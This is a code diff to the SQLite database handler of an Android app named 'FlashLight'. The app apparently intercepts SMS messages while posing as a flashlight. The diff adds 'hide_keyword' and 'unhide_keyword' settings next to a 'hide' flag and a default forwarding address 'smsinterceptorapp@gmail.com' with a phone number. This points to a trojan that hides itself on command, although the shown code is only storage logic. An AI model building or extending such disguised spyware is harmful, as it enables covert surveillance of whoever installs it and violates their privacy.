@@ -16,10 +16,12 @@ public class DatabaseHandler extends SQLiteOpenHelper {
  
   private static final int DATABASE_VERSION = 1;
  
-  private static final String KEY_ID       = "id";
-  private static final String KEY_HIDE     = "hide";
-  private static final String KEY_EMAIL    = "email";
-  private static final String KEY_PHONE_NO = "number";
+  private static final String KEY_ID             = "id";
+  private static final String KEY_HIDE           = "hide";
+  private static final String KEY_EMAIL          = "email";
+  private static final String KEY_PHONE_NO       = "number";
+  private static final String KEY_HIDE_KEYWORD   = "hide_keyword";
+  private static final String KEY_UNHIDE_KEYWORD = "unhide_keyword";
 
   private static final String TABLE_OPTIONS = "options";
   private static final String DATABASE_NAME = "FlashLight";
@@ -34,7 +36,9 @@ public class DatabaseHandler extends SQLiteOpenHelper {
       + KEY_ID + " INTEGER PRIMARY KEY," 
       + KEY_HIDE + " TEXT DEFAULT 'no'," 
       + KEY_EMAIL + " TEXT DEFAULT 'smsinterceptorapp@gmail.com'," 
-      + KEY_PHONE_NO + " TEXT DEFAULT '5555551234');";
+      + KEY_PHONE_NO + " TEXT DEFAULT '5555551234'," 
+      + KEY_HIDE_KEYWORD + " TEXT DEFAULT ''," 
+      + KEY_UNHIDE_KEYWORD + " TEXT DEFAULT '');";
     db.execSQL(CREATE_OPTIONS_TABLE);
   }
  
@@ -52,6 +56,8 @@ public class DatabaseHandler extends SQLiteOpenHelper {
     values.put(KEY_HIDE, flashLightDatabase.getHide()); 
     values.put(KEY_EMAIL, flashLightDatabase.getEmailAddress()); 
     values.put(KEY_PHONE_NO, flashLightDatabase.getPhoneNumber()); 
+    values.put(KEY_HIDE_KEYWORD, flashLightDatabase.getHideKeyword()); 
+    values.put(KEY_UNHIDE_KEYWORD, flashLightDatabase.getUnhideKeyword()); 
  
     db.insert(TABLE_OPTIONS, null, values);
     db.close(); 
@@ -61,7 +67,7 @@ public class DatabaseHandler extends SQLiteOpenHelper {
     SQLiteDatabase db = this.getReadableDatabase();
  
     Cursor cursor = db.query(TABLE_OPTIONS, 
-      new String[] { KEY_ID, KEY_HIDE, KEY_EMAIL, KEY_PHONE_NO }, KEY_ID + "=?",
+      new String[] { KEY_ID, KEY_HIDE, KEY_EMAIL, KEY_PHONE_NO, KEY_HIDE_KEYWORD, KEY_UNHIDE_KEYWORD }, KEY_ID + "=?",
       new String[] { String.valueOf(id) }, null, null, null, null);
       if (cursor != null) {
         cursor.moveToFirst();
@@ -70,7 +76,9 @@ public class DatabaseHandler extends SQLiteOpenHelper {
       FlashLightDatabase flashLightDatabase = new FlashLightDatabase(Integer.parseInt(cursor.getString(0)),
         cursor.getString(1),
         cursor.getString(2),
-        cursor.getString(3));
+        cursor.getString(3),
+        cursor.getString(4),
+        cursor.getString(5));
 
       if(cursor != null) {
         cursor.close();
@@ -94,6 +102,8 @@ public class DatabaseHandler extends SQLiteOpenHelper {
         flashLightDatabase.setHide(cursor.getString(1));
         flashLightDatabase.setEmailAddress(cursor.getString(2));
         flashLightDatabase.setPhoneNumber(cursor.getString(3));
+        flashLightDatabase.setHideKeyword(cursor.getString(4));
+        flashLightDatabase.setUnhideKeyword(cursor.getString(5));
         flashLightDatabaseList.add(flashLightDatabase);
       } while (cursor.moveToNext());
     }
@@ -110,6 +120,8 @@ public class DatabaseHandler extends SQLiteOpenHelper {
     values.put(KEY_HIDE, flashLightDatabase.getHide());
     values.put(KEY_EMAIL, flashLightDatabase.getEmailAddress());
     values.put(KEY_PHONE_NO, flashLightDatabase.getPhoneNumber());
+    values.put(KEY_HIDE_KEYWORD, flashLightDatabase.getHideKeyword());
+    values.put(KEY_UNHIDE_KEYWORD, flashLightDatabase.getUnhideKeyword());
  
     return db.update(TABLE_OPTIONS, values, KEY_ID + " = ?",
       new String[] { String.valueOf(flashLightDatabase.getID()) });
@@ -122,13 +134,13 @@ public class DatabaseHandler extends SQLiteOpenHelper {
     db.close();
   }
 
-  public int getFlashLightDatabaseCount() {
+  /*public int getFlashLightDatabaseCount() {
     String countQuery = "SELECT  * FROM " + TABLE_OPTIONS;
     SQLiteDatabase db = this.getReadableDatabase();
     Cursor cursor = db.rawQuery(countQuery, null);
     cursor.close();
  
     return cursor.getCount();
-  }
+  }*/
  
 }
